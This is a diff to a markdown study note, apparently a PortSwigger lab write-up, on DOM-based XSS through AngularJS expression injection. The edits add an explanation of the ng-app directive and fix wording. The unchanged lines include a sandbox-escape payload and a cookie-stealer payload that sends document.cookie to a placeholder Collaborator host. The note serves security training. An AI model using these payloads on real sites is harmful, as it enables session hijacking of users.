@@ -54,7 +54,9 @@
 * location.search
 * addEventListener  
   
->AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is identified by noticing the search string is enclosed in an **ng-app** directive.  
+>AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is identified by noticing the search string is enclosed in an **ng-app** directive. Review the HTML code to identify ng-app directive telling AngularJS that this is the root element of the AngularJS application.  
+
+![domxss-on-constructor.png](images/ng-app-code-review.png)  
 
 >PortSwigger lab payload below:
 
@@ -62,7 +64,7 @@
 {{$on.constructor('alert(1)')()}}
 ```  
 
->Cookie stealer payload that can be placed in iframe, hosted on an exploit server, resulting in the victim session cookie send to Burp Cllaborator.  
+>Cookie stealer payload that can be placed in iframe, hosted on an exploit server, resulting in the victim session cookie being send to Burp Cllaborator.  
 
 ```JavaScript
 {{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
